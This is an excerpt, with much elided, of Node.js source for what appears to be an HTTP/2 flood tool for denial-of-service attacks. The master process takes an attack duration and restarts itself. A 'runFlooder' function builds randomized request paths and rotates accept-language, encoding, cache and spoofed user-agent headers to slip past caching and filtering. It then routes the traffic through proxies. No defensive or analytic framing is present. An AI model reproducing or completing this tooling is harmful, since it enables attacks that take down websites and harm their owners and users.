...
if (cluster.isMaster) {
  ...
  console.log(
    ` >> Duration     : `.brightYellow + process.argv[3] + " seconds"
  );
  ...
  const restartScript = () => {
    ...
    console.log(
      `[>] Restarting the script in ${RESTART_DELAY} ms...`.brightCyan
    );
    setTimeout(() => {
...
function runFlooder() {
  ...
  const rateHeaders = [
    ...
    {
      "accept-language":
        language_header[Math.floor(Math.random() * language_header.length)],
    },
  ...
  let headers = {
    ...
    ":scheme": "https",
    ":path":
      parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25),
    ":method": "GET",
    pragma: "no-cache",
    "upgrade-insecure-requests": "1",
    "accept-encoding":
      encoding_header[Math.floor(Math.random() * encoding_header.length)],
    "cache-control":
      cache_header[Math.floor(Math.random() * cache_header.length)],
    ...
    "user-agent":
      ...
      " " +
      nm4 +
      ") /Gecko/20100101 Edg/91.0.864.59 " +
      nm4,
  };
  const proxyOptions = {
    host: parsedProxy[0],
